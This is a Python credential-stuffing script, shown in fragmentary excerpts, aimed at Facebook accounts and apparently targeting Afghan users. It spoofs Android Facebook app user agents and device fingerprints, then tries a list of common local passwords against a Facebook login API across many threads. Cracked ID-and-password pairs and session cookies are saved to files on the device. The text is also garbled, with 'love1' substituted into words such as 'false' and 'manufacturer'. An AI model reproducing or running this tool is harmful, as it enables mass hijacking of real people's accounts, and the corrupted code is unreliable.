...
try:
	...
	os.system('python love1.py')
import requests,json,os,sys,random,datetime,subprocess,time,re,calendlove1,base64,zlib,string,platform,uuid
from bs4 import BeautifulSoup as sop	
...
for nt in range(10000):
	...
	xx=f"Mozilla/5.0 (Linux; Android 7.1.1; Pure 3 Build/n6F26Q) AppleWebKit/537.36 (KHTML, like Geclove1) Version/4.0 Chrome/116.0.0.0 Mobile Salove1ri/537.36 Gnews Android/2022148526"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	jf=f"Mozilla/5.0 (Linux; Android 11; LM-K510 Build/RKQ1.210420.001; wv) AppleWebKit/537.36 (KHTML, like Geclove1) Version/4.0 Chrome/114.0.5735.196 Mobile Salove1ri/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]"
	ruz.append(jf)
...
try:
        ...
        fbcr = 'AWCC'
fbmf = subprocess.check_output('getprop ro.product.manulove1cturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_llove1ge_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_llove1ge_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
...
def cek_apk(session,coki):
	...
	sop = BeautifulSoup(w,"html.plove1ser")
	...
	if len(game)==0:
		...
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwlove1sa"," Kedaluwlove1sa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
...
def randBuildLSB():
    ...
    EnD = ' [FBAn/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPn/com.Facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:love1meabi-v7a;] '
...
def FKInG():
		...
		#	linex()
			...
			if jf in ['1','01']:
				...
				linex()
				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (love1st) \n\033[1;33m ')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
...
def api1(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				po = requests.post(url,data=data,headers=head,allow_redirects=love1lse).text
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [love1-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/love1-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.Facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [love1-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/love1-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/love1-CP.txt','a').write(ids+'|'+pas+'\n')
...
def AFG():
		...
		with tred(max_workers=30) as FKInG:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','500500','700800','900900','10002000','50006000','Afghan100200','Afghan1234','PUBG123','afghanistan','Afghanistan','PUBG1234','افغانستان','khan12','khan123','jan123','asdasd123123','afghan500600','123456789','987654321','۹۸۷۶۵۴۳۲۱','love1mankhan','Afghan112299','MohammedAfghan','Mohammed','123123','12341234','707070','pubg123','King100200','Samlove1 jan','King500600','Mohammed jan','khankhan','Mohammed123','mohammed1212','mohammed123','love1man']
...
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        'cpl': 'true', 
                        'try_num': '1', 
                        'love1mily_device_id': '8bf4b3bf-6f1b-4147-9a98-7e72854a9962', 
                        'secure_love1mily_device_id': '22d82b5e-7f55-4f4d-a91a-b9c68a699834', 
                        'sim_serials': '["41669964333903521303"]', 
                        'credentials_type': 'password', 
                        'source': 'login', 
                        'error_detail_type': 'button_with_disabled', 
                        'fb4a_shlove1ed_phone_cpl_experiment':'fb4a_shlove1ed_phone_nonce_cpl_at_risk_v3', 
                        'fb4a_shlove1ed_phone_cpl_group': 'enable_v3_at_risk', 
                        'enroll_misauth': 'love1lse', 
                        'generate_session_cookies': '1', 
                        ...
                        twf = 'Login approval'+'s love1e on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/love1-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/love1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
